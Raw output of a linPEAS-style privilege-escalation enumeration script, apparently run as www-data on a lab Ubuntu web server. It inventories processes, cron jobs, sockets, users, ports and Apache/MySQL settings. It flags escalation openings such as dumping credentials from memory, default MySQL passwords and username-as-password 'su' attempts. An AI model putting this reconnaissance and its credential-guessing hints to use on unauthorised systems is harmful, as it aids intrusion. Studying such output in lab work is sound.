lightdm   1059  0.0  0.2 354428   984 ?        Sl   12:35   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm   1071  0.0  0.0 206972   484 ?        Sl   12:35   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm   1080  0.0  0.1 178532   924 ?        Sl   12:35   0:00 /usr/lib/dconf/dconf-service
lightdm   1088  0.0  0.2  53024  1176 ?        S    12:35   0:00 upstart --user --startup-event indicator-services-start
lightdm   1093  0.0  0.2 377116  1384 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-messages/indicator-messages-service
lightdm   1095  0.0  0.2 356108  1136 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm   1096  0.0  0.3 366564  1832 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-power/indicator-power-service
lightdm   1097  0.0  0.6 553588  3316 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm   1098  0.1  1.0 572236  5172 ?        Ssl  12:35   0:01  _ /usr/lib/x86_64-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm   1099  0.0  0.3 682668  1824 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-sound/indicator-sound-service
lightdm   1100  0.0  0.2 643248  1252 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-session/indicator-session-service
lightdm   1118  0.0  0.4 403148  2080 ?        Ssl  12:35   0:00  _ /usr/lib/x86_64-linux-gnu/indicator-application/indicator-application-service
lightdm   1143  0.0  0.3 342648  1740 ?        S<l  12:35   0:00  _ /usr/bin/pulseaudio --start --log-target=syslog
lightdm   1090  0.1  1.1 603156  5684 ?        Sl   12:35   0:01 nm-applet
lightdm   1094  0.2  1.0 627968  5284 ?        Sl   12:35   0:02 /usr/lib/unity-settings-daemon/unity-settings-daemon
rtkit     1144  0.0  0.1 183544   732 ?        SNsl 12:35   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
root      1171  0.0  0.3 345864  1520 ?        Ssl  12:35   0:00 /usr/lib/upower/upowerd
colord    1178  0.0  0.6 320532  3232 ?        Ssl  12:35   0:01 /usr/lib/colord/colord
root      1466  0.0  0.2 100344  1140 ?        Ss   12:40   0:00 /usr/sbin/cupsd -l
root      1467  0.0  0.3 274812  1584 ?        Ssl  12:40   0:00 /usr/sbin/cups-browsed

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                                                                                                             

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm process found (dump creds from memory as root)                                                                                                                                                                                      
vsftpd Not Found
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Jul 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root   244 Dec 28  2014 anacron
-rw-r--r--   1 root root   670 Jun 22  2017 php
-rw-r--r--   1 root root   190 Jul 26  2019 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 Jul 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   539 Jun 11  2018 apache2
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 Oct  9  2018 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   435 Nov 17  2014 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root  3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root   214 Dec  7  2018 update-notifier-common
-rwxr-xr-x   1 root root  1046 May 19  2016 upstart

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron

/etc/cron.weekly:
total 36
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root    86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root   771 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   211 Dec  7  2018 update-notifier-common

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Jul 26  2019 .
drwxr-xr-x 7 root root 4096 Feb 26  2019 ..
-rw------- 1 root root    9 Nov  1 12:40 cron.daily
-rw------- 1 root root    9 Nov  1 12:50 cron.monthly
-rw------- 1 root root    9 Nov  1 12:45 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path                                                                                                                                              
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT                 LAST                         PASSED    UNIT                         ACTIVATES                                                                                                             
Fri 2019-07-26 20:55:33 PDT  3 years 3 months ago Tue 2022-11-01 12:35:01 PDT  22min ago apt-daily.timer              apt-daily.service
Sat 2019-07-27 06:48:23 PDT  3 years 3 months ago Tue 2022-11-01 12:35:01 PDT  22min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2022-11-02 12:49:13 PDT  23h left             Tue 2022-11-01 12:49:13 PDT  8min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a                  n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a                  n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket                                                                                                                
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/com/ubuntu/upstart-session/108/1088                                                                                                                                                                                                        
/run/acpid.socket
  └─(Read Write)
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/108/pulse/native
/run/user/108/systemd/private
/run/uuidd/request
  └─(Read Write)
/tmp/.X11-unix/X0
  └─(Read Write)
/tmp/dbus-Ki7zrs94AX
/tmp/dbus-Oc6gvuyBUn
/var/run/avahi-daemon/socket
  └─(Read Write)
/var/run/cups/cups.sock
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                                                                                                                                           
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.dbus (  <policy user="kernoops">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                              
:1.0                                       636 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                       625 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
:1.10                                      791 polkitd         root             :1.10         polkitd.service           -          -                  
:1.13                                      802 lightdm         root             :1.13         lightdm.service           -          -                  
:1.15                                      848 Xorg            root             :1.15         lightdm.service           -          -                  
:1.16                                      889 whoopsie        whoopsie         :1.16         whoopsie.service          -          -                  
:1.17                                     1011 lightdm         root             :1.17         session-c1.scope          c1         -                  
:1.2                                         1 systemd         root             :1.2          init.scope                -          -                  
:1.20                                     1028 unity-greeter   lightdm          :1.20         session-c1.scope          c1         -                  
:1.21                                     1088 upstart         lightdm          :1.21         session-c1.scope          c1         -                  
:1.22                                     1095 indicator-bluet lightdm          :1.22         session-c1.scope          c1         -                  
:1.23                                     1100 indicator-sessi lightdm          :1.23         session-c1.scope          c1         -                  
:1.24                                     1093 indicator-messa lightdm          :1.24         session-c1.scope          c1         -                  
:1.25                                     1096 indicator-power lightdm          :1.25         session-c1.scope          c1         -                  
:1.26                                     1097 indicator-datet lightdm          :1.26         session-c1.scope          c1         -                  
:1.28                                     1144 rtkit-daemon    root             :1.28         rtkit-daemon.service      -          -                  
:1.29                                     1143 pulseaudio      lightdm          :1.29         session-c1.scope          c1         -                  
:1.30                                     1098 indicator-keybo lightdm          :1.30         session-c1.scope          c1         -                  
:1.32                                     1090 nm-applet       lightdm          :1.32         session-c1.scope          c1         -                  
:1.34                                     1094 unity-settings- lightdm          :1.34         session-c1.scope          c1         -                  
:1.35                                     1171 upowerd         root             :1.35         upower.service            -          -                  
:1.36                                     1178 colord          colord           :1.36         colord.service            -          -                  
:1.4                                       687 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
:1.41                                     1466 cupsd           root             :1.41         cups.service              -          -                  
:1.42                                     1467 cups-browsed    root             :1.42         cups-browsed.service      -          -                  
:1.43                                     1467 cups-browsed    root             :1.43         cups-browsed.service      -          -                  
:1.51                                     8437 busctl          www-data         :1.51         apache2.service           -          -                  
:1.9                                       682 NetworkManager  root             :1.9          NetworkManager.service    -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
com.ubuntu.LanguageSelector                  - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                - -               -                (activatable) -                         -         
com.ubuntu.SystemService                     - -               -                (activatable) -                         -         
com.ubuntu.USBCreator                        - -               -                (activatable) -                         -         
com.ubuntu.WhoopsiePreferences               - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant              - -               -                (activatable) -                         -         
fi.w1.wpa_supplicant1                        - -               -                (activatable) -                         -         
io.snapcraft.SnapdLoginService               - -               -                (activatable) -                         -         
org.bluez                                    - -               -                (activatable) -                         -         
org.debian.apt                               - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   687 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      625 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              1178 colord          colord           :1.36         colord.service            -          -                  
org.freedesktop.DBus                       643 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.DisplayManager             802 lightdm         root             :1.13         lightdm.service           -          -                  
org.freedesktop.ModemManager1                - -               -                (activatable) -                         -         
org.freedesktop.NetworkManager             682 NetworkManager  root             :1.9          NetworkManager.service    -          -                  
org.freedesktop.PackageKit                   - -               -                (activatable) -                         -         
org.freedesktop.PolicyKit1                 791 polkitd         root             :1.10         polkitd.service           -          -                  
org.freedesktop.RealtimeKit1              1144 rtkit-daemon    root             :1.28         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                      - -               -                (activatable) -                         -         
org.freedesktop.UPower                    1171 upowerd         root             :1.35         upower.service            -          -                  
org.freedesktop.fwupd                        - -               -                (activatable) -                         -         
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     636 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.resolve1                     - -               -                (activatable) -                         -         
org.freedesktop.systemd1                     1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald                     - -               -                (activatable) -                         -         
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
ubuntu                                                                                                                                                                                                                                      
127.0.0.1       localhost
127.0.1.1       ubuntu

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:3a:11:97:ad:55  
          inet addr:10.10.233.211  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::3a:11ff:fe97:ad55/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1810 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1664 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1021283 (1.0 MB)  TX bytes:240956 (240.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:181 errors:0 dropped:0 overruns:0 frame:0
          TX packets:181 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:14004 (14.0 KB)  TX bytes:14004 (14.0 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb was found in PATH

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(lightdm) gid=114(lightdm) groups=114(lightdm)
uid=109(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=110(avahi-autoipd) gid=119(avahi-autoipd) groups=119(avahi-autoipd)
uid=111(avahi) gid=120(avahi) groups=120(avahi)
uid=112(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=113(colord) gid=123(colord) groups=123(colord)
uid=114(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=117(pulse) gid=124(pulse) groups=124(pulse),29(audio)
uid=118(rtkit) gid=126(rtkit) groups=126(rtkit)
uid=119(saned) gid=127(saned) groups=127(saned),122(scanner)
uid=120(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=121(mysql) gid=129(mysql) groups=129(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 12:59:53 up 25 min,  0 users,  load average: 3.04, 2.69, 1.82                                                                                                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
                                                                                                                                                                                                                                            
wtmp begins Tue Nov  1 12:40:06 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/g++
/usr/bin/gcc
/usr/bin/gdb
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
/usr/bin/xterm

╔══════════╣ Installed Compilers
ii  g++                                        4:5.3.1-1ubuntu1                             amd64        GNU C++ compiler                                                                                                                   
ii  g++-5                                      5.4.0-6ubuntu1~16.04.11                      amd64        GNU C++ compiler
ii  gcc                                        4:5.3.1-1ubuntu1                             amd64        GNU C compiler
ii  gcc-5                                      5.4.0-6ubuntu1~16.04.11                      amd64        GNU C compiler
ii  hardening-includes                         2.7ubuntu2                                   all          Makefile for enabling compiler flags for security hardening
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.27, for Linux (x86_64) using  EditLine wrapper                                                                                                                                                                 


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                                                                                  
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                                                                  
                                                                                                                                                                                                                                            
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                                                                             
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 317 Jul 26  2019 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                      
Server built:   2019-04-03T13:34:47
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/conf-available/php7.0-cgi.conf-
/etc/apache2/conf-available/php7.0-cgi.conf:# application/x-httpd-php                        phtml pht php
/etc/apache2/conf-available/php7.0-cgi.conf:# application/x-httpd-php3                       php3
/etc/apache2/conf-available/php7.0-cgi.conf:# application/x-httpd-php4                       php4
/etc/apache2/conf-available/php7.0-cgi.conf:# application/x-httpd-php5                       php
/etc/apache2/conf-available/php7.0-cgi.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/conf-available/php7.0-cgi.conf:    SetHandler application/x-httpd-php
/etc/apache2/conf-available/php7.0-cgi.conf-</FilesMatch>
/etc/apache2/conf-available/php7.0-cgi.conf:# application/x-httpd-php-source                 phps
/etc/apache2/conf-available/php7.0-cgi.conf-<FilesMatch ".+\.phps$">
/etc/apache2/conf-available/php7.0-cgi.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/conf-available/php7.0-cgi.conf-#</Directory>
/etc/apache2/conf-available/php7.0-cgi.conf:#Action application/x-httpd-php /cgi-bin/php7.0
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jul 26  2019 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Jul 26  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Jul 26  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
     <Directory /var/www/html/>
          Options FollowSymlinks
          AllowOverride All
          Require all granted
     </Directory>
</VirtualHost>


-rw-r--r-- 1 root root 1473 Jul 26  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
     <Directory /var/www/html/>
          Options FollowSymlinks
          AllowOverride All
          Require all granted
     </Directory>
</VirtualHost>
lrwxrwxrwx 1 root root 35 Jul 26  2019 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
     <Directory /var/www/html/>
          Options FollowSymlinks
          AllowOverride All
          Require all granted
     </Directory>
</VirtualHost>

-rw-r--r-- 1 root root 70999 Jun  4  2019 /etc/php/7.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
